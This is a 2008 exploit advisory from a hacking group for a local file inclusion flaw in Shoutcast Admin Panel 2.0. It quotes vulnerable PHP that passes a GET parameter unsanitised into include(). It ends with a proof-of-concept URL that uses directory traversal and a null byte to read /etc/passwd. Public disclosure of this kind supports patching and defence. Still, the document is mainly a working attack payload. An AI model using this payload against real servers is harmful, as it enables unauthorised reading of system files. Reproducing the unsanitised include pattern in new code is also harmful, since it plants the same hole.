@@ -1,0 +1,63 @@
+============================================================
+ Shoutcast Admin Panel 2.0 Local File Inclusion Vulnerability
+============================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE : 14 June 2008
+SITE : www.citec.us
+
+
+#####################################################
+ APPLICATION : WallCity-Server: Shoutcast Admin Panel
+ VERSION     : 2.0
+ DOWNLOAD    : http://downloads.sourceforge.net/shoutcastadmin
+#####################################################
+
+---LFI---
+
+-------------------------
+ Vulnerable in index.php
+-------------------------
+
+@Line
+
+    79: if (isset($_GET['page']))
+    80:         $page = $_GET['page'];
+    81: else
+    82: 	$page = "main";
+    .
+    .
+    .
+   204:  <?PHP if(!include("pages/".$page.".php"))
+   205:		{
+   206:			table("Achtung!");
+   207:			echo "Die Seite existiert nicht!"; 
+   208:			closetable();
+   209:		}
+   210:	 ?>
+
+-------------
+ POC Exploit
+-------------
+
+[+] http://192.168.24.25/wallcity/index.php?page=../../../../../../etc/passwd%00
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-14]
